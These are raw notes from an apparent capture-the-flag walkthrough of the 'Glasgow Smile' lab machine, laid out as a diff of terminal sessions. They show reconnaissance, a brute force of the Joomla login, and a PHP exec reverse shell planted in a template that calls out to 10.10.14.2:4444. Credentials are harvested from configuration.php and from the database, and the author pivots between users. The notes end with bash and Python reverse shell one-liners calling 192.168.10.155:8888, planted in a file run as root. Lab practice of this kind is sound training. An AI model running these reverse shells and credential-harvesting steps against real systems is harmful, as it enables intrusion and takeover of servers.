@@ -1,0 +1,318 @@
+└─$ nmap -p- 172.16.33.58  
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-23 18:47 CST
+Nmap scan report for 172.16.33.58
+Host is up (0.039s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+└─$ nmap -sV -A 172.16.33.58 -p 80   
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-23 18:48 CST
+Nmap scan report for 172.16.33.58
+Host is up (0.038s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.4.38 (Debian)
+
+# this site is built by joomla.
+
+┌──(edk㉿kali)-[~]
+└─$ sudo dirsearch -u http://172.16.33.58                
+[sudo] password for edk: 
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3                                                                                            
+ (_||| _) (/_(_|| (_| )                                                                                                     
+                                                                                                                            
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /home/edk/reports/http_172.16.33.58/_24-07-23_20-02-19.txt
+
+Target: http://172.16.33.58/
+
+[20:02:19] Starting:                                                                                                        
+[20:02:22] 403 -  277B  - /.ht_wsr.txt                                      
+[20:02:22] 403 -  277B  - /.htaccess.bak1                                   
+[20:02:22] 403 -  277B  - /.htaccess.orig
+[20:02:22] 403 -  277B  - /.htaccess.sample
+[20:02:22] 403 -  277B  - /.htaccess.save
+[20:02:22] 403 -  277B  - /.htaccess_extra                                  
+[20:02:22] 403 -  277B  - /.htaccess_sc
+[20:02:22] 403 -  277B  - /.htaccess_orig
+[20:02:22] 403 -  277B  - /.htaccessBAK
+[20:02:22] 403 -  277B  - /.htaccessOLD
+[20:02:22] 403 -  277B  - /.htaccessOLD2
+[20:02:22] 403 -  277B  - /.html                                            
+[20:02:22] 403 -  277B  - /.htm
+[20:02:22] 403 -  277B  - /.htpasswd_test                                   
+[20:02:22] 403 -  277B  - /.htpasswds
+[20:02:22] 403 -  277B  - /.httr-oauth                                      
+[20:02:22] 403 -  277B  - /.php                                             
+[20:02:41] 301 -  313B  - /joomla  ->  http://172.16.33.58/joomla/          
+[20:02:41] 301 -  327B  - /joomla/administrator  ->  http://172.16.33.58/joomla/administrator/
+[20:02:41] 200 -    3KB - /joomla/                                          
+[20:02:52] 403 -  277B  - /server-status                                    
+[20:02:52] 403 -  277B  - /server-status/                                   
+                                                                             
+Task Completed          
+
+
+
+
+
+
+┌──(edk㉿kali)-[~]
+└─$ cewl -m 5 http://172.16.33.58/joomla/ > pass.txt
+
+#use burp to brute force the passwd by using pass.txt with the id=joomla
+
+and got joomla Gotham
+
+#login and found a module is editable.
+#added a bash shell command to the php cource code
+exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1'");
+
+then click the template preview after the nc listing on my host.
+
+#a www-data use shell will be prompted.
+
+www-data@glasgowsmile:/var/www/html/joomla$ cat /etc/passwd
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+rob:x:1000:1000:rob,,,:/home/rob:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+mysql:x:106:113:MySQL Server,,,:/nonexistent:/bin/false
+abner:x:1001:1001:Abner,,,:/home/abner:/bin/bash
+penguin:x:1002:1002:Penguin,,,:/home/penguin:/bin/bash
+www-data@glasgowsmile:/var/www/html/joomla$ 
+
+#3 users have bash, then tried to collect more system info and user info.
+
+drwxr-xr-x 11 root root  4096 Jun 16  2020 administrator
+drwxr-xr-x  2 root root  4096 Jun 16  2020 bin
+drwxr-xr-x  2 root root  4096 Jun 16  2020 cache
+drwxr-xr-x  2 root root  4096 Jun 16  2020 cli
+drwxr-xr-x 19 root root  4096 Jun 16  2020 components
+-rwxr-xr-x  1 root root  1924 Jun 16  2020 configuration.php
+-rwxr-xr-x  1 root root  3005 Jun 16  2020 htaccess.txt
+drwxr-xr-x  5 root root  4096 Jun 16  2020 images
+drwxr-xr-x  2 root root  4096 Jun 16  2020 includes
+-rwxr-xr-x  1 root root  1420 Jun 16  2020 index.php
+drwxr-xr-x  4 root root  4096 Jun 16  2020 language
+drwxr-xr-x  5 root root  4096 Jun 16  2020 layouts
+drwxr-xr-x 11 root root  4096 Jun 16  2020 libraries
+drwxr-xr-x 26 root root  4096 Jun 16  2020 media
+drwxr-xr-x 27 root root  4096 Jun 16  2020 modules
+drwxr-xr-x 16 root root  4096 Jun 16  2020 plugins
+-rwxr-xr-x  1 root root   836 Jun 16  2020 robots.txt
+drwxr-xr-x  5 root root  4096 Jun 16  2020 templates
+drwxr-xr-x  2 root root  4096 Jun 16  2020 tmp
+-rwxr-xr-x  1 root root  1690 Jun 16  2020 web.config.txt
+
+
+www-data@glasgowsmile:/var/www/html/joomla$ cat configuration.php
+cat configuration.php
+<?php
+class JConfig {
+        public $offline = '0';
+        public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
+        public $display_offline_message = '1';
+        public $offline_image = '';
+        public $sitename = 'Joker';
+        public $editor = 'tinymce';
+        public $captcha = '0';
+        public $list_limit = '20';
+        public $access = '1';
+        public $debug = '0';
+        public $debug_lang = '0';
+        public $dbtype = 'mysqli';
+        public $host = 'localhost';
+        public $user = 'joomla';
+        public $password = 'babyjoker';
+        public $db = 'joomla_db';
+        public $dbprefix = 'jnqcu_';
+        public $live_site = '';
+        public $secret = 'fNRyp6KO51013435';
+
+#got the id and passwd of mysql.
+
+#mysql -u joomla -p
+
+> show databases();
+
+> use joomla_db;
+
+
+
+MariaDB [joomla_db]> select * from jnqcu_users;
+select * from jnqcu_users;
++-----+------------+----------+-------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+----------------------------------------------------------------------------------------------+---------------------+------------+--------+------+--------------+
+| id  | name       | username | email       | password                                                     | block | sendEmail | registerDate        | lastvisitDate       | activation | params                                                                                       | lastResetTime       | resetCount | otpKey | otep | requireReset |
++-----+------------+----------+-------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+----------------------------------------------------------------------------------------------+---------------------+------------+--------+------+--------------+
+| 736 | Super User | joomla   | admin@joker | $2y$10$9.svWPvNCg0qoD1mf8NJFe1SHltICeEvVS7alBkG3M3aFoPFge9yu |     0 |         1 | 2020-06-13 18:19:57 | 2022-11-16 16:06:04 | 0          | {"admin_style":"","admin_language":"","language":"","editor":"","helpsite":"","timezone":""} | 0000-00-00 00:00:00 |          0 |        |      |            0 |
++-----+------------+----------+-------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+----------------------------------------------------------------------------------------------+---------------------+------------+--------+------+--------------+
+1 row in set (0.000 sec)
+
+#the passwd of admin is not decrypted.
+
+MariaDB [information_schema]> use batjoke
+use batjoke
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MariaDB [batjoke]> show tables;
+show tables;
++-------------------+
+| Tables_in_batjoke |
++-------------------+
+| equipment         |
+| taskforce         |
++-------------------+
+2 rows in set (0.000 sec)
+
+
+MariaDB [batjoke]> select * from taskforce;
+select * from taskforce;
++----+---------+------------+---------+----------------------------------------------+
+| id | type    | date       | name    | pswd                                         |
++----+---------+------------+---------+----------------------------------------------+
+|  1 | Soldier | 2020-06-14 | Bane    | YmFuZWlzaGVyZQ==                             |
+|  2 | Soldier | 2020-06-14 | Aaron   | YWFyb25pc2hlcmU=                             |
+|  3 | Soldier | 2020-06-14 | Carnage | Y2FybmFnZWlzaGVyZQ==                         |
+|  4 | Soldier | 2020-06-14 | buster  | YnVzdGVyaXNoZXJlZmY=                         |
+|  6 | Soldier | 2020-06-14 | rob     | Pz8/QWxsSUhhdmVBcmVOZWdhdGl2ZVRob3VnaHRzPz8/ |
+|  7 | Soldier | 2020-06-14 | aunt    | YXVudGlzIHRoZSBmdWNrIGhlcmU=                 |
++----+---------+------------+---------+----------------------------------------------+
+6 rows in set (0.000 sec)
+
+└─$ echo Pz8/QWxsSUhhdmVBcmVOZWdhdGl2ZVRob3VnaHRzPz8/ | base64 -d                                             
+???AllIHaveAreNegativeThoughts??? 
+
+
+└─$ ssh rob@172.16.33.58                 
+The authenticity of host '172.16.33.58 (172.16.33.58)' can't be established.
+ED25519 key fingerprint is SHA256:bVGopxZOACv+Dy/jm+EmAyAQm+YSDTmVK1pVrNUz+P8.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '172.16.33.58' (ED25519) to the list of known hosts.
+rob@172.16.33.58's password: 
+Linux glasgowsmile 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Jun 16 13:24:25 2020 from 192.168.10.172
+rob@glasgowsmile:~$ ls
+Abnerineedyourhelp  howtoberoot  user.txt
+rob@glasgowsmile:~$ cat user.txt
+JKR[f5bb11acbb957915e421d62e7253d27a]
+
+rob@glasgowsmile:~$ cat Abnerineedyourhelp 
+Gdkkn Cdzq, Zqsgtq rteedqr eqnl rdudqd ldmszk hkkmdrr ats vd rdd khsskd rxlozsgx enq ghr bnmchshnm. Sghr qdkzsdr sn ghr eddkhmf zants adhmf hfmnqdc. Xnt bzm ehmc zm dmsqx hm ghr intqmzk qdzcr, "Sgd vnqrs ozqs ne gzuhmf z ldmszk hkkmdrr hr odnokd dwodbs xnt sn adgzud zr he xnt cnm's."
+Mnv H mddc xntq gdko Zamdq, trd sghr ozrrvnqc, xnt vhkk ehmc sgd qhfgs vzx sn rnkud sgd dmhflz. RSLyzF9vYSj5aWjvYFUgcFfvLCAsXVskbyP0aV9xYSgiYV50byZvcFggaiAsdSArzVYkLZ==
+
+
+Hello Dear, Arthur suffers from severe mental illness but we see little sympathy for his condition. This relates to his feeling about being ignored. You can find an entry in his journal reads, "The worst part of having a mental illness is people expect you to behave as if you don't."
+Now I need your help Abner, use this password, you will find the right way to solve the enigma. STMzaG9wZTk5bXkwZGVhdGgwMDBtYWtlczQ0bW9yZThjZW50czAwdGhhbjBteTBsaWZlMA==
+
+
+echo STMzaG9wZTk5bXkwZGVhdGgwMDBtYWtlczQ0bW9yZThjZW50czAwdGhhbjBteTBsaWZlMA== | base64 -d
+I33hope99my0death000makes44more8cents00than0my0life0
+
+
+rob@glasgowsmile:/home/abner$ su abner
+Password: 
+abner@glasgowsmile:~$ 
+abner@glasgowsmile:~$ id 
+uid=1001(abner) gid=1001(abner) groups=1001(abner)
+
+abner@glasgowsmile:~$ cat user2.txt 
+JKR{0286c47edc9bfdaf643f5976a8cfbd8d}
+
+abner@glasgowsmile:~$ cat info.txt 
+A Glasgow smile is a wound caused by making a cut from the corners of a victim's mouth up to the ears, leaving a scar in the shape of a smile.
+The act is usually performed with a utility knife or a piece of broken glass, leaving a scar which causes the victim to appear to be smiling broadly.
+The practice is said to have originated in Glasgow, Scotland in the 1920s and 30s. The attack became popular with English street gangs (especially among the Chelsea Headhunters, a London-based hooligan firm, among whom it is known as a "Chelsea grin" or "Chelsea smile").
+
+abner@glasgowsmile:~$ cat .bash_history 
+whoami
+systemctl reboot
+fuck
+su penguin
+mysql -u root -p
+exit
+cd .bash/
+ls
+unzip .dear_penguins.zip
+cat dear_penguins
+rm dear_penguins
+exit
+ls
+cd /home/abner/
+ls
+exit
+
+abner@glasgowsmile:~$ find / -name *penguins* 2>/dev/null
+/var/www/joomla2/administrator/manifests/files/.dear_penguins.zip
+
+abner@glasgowsmile:~$ unzip dear.zip 
+Archive:  dear.zip
+[dear.zip] dear_penguins password: 
+  inflating: dear_penguins     # passwd is the same as abner
+
+abner@glasgowsmile:~$ cat dear_penguins 
+My dear penguins, we stand on a great threshold! It's okay to be scared; many of you won't be coming back. Thanks to Batman, the time has come to punish all of God's children! First, second, third and fourth-born! Why be biased?! Male and female! Hell, the sexes are equal, with their erogenous zones BLOWN SKY-HIGH!!! FORWAAAAAAAAAAAAAARD MARCH!!! THE LIBERATION OF GOTHAM HAS BEGUN!!!!!
+scf4W7q4B4caTMRhSFYmktMsn87F35UkmKttM5Bz
+
+#got pengin's passwd
+abner@glasgowsmile:~$ su penguin
+Password: 
+penguin@glasgowsmile:/home/abner$ id
+uid=1002(penguin) gid=1002(penguin) groups=1002(penguin)
+
+penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ cat user3.txt 
+JKR{284a3753ec11a592ee34098b8cb43d52}
+
+penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ cat PeopleAreStartingToNotice.txt 
+Hey Penguin,
+I'm writing software, I can't make it work because of a permissions issue. It only runs with root permissions. When it's complete I'll copy it to this folder.
+
+Joker
+
+penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ nano .trash_old 
+#add a reverse shell 
+bash -i >& /dev/tcp/IP/port 0>&1
+
+python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.10.155",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+
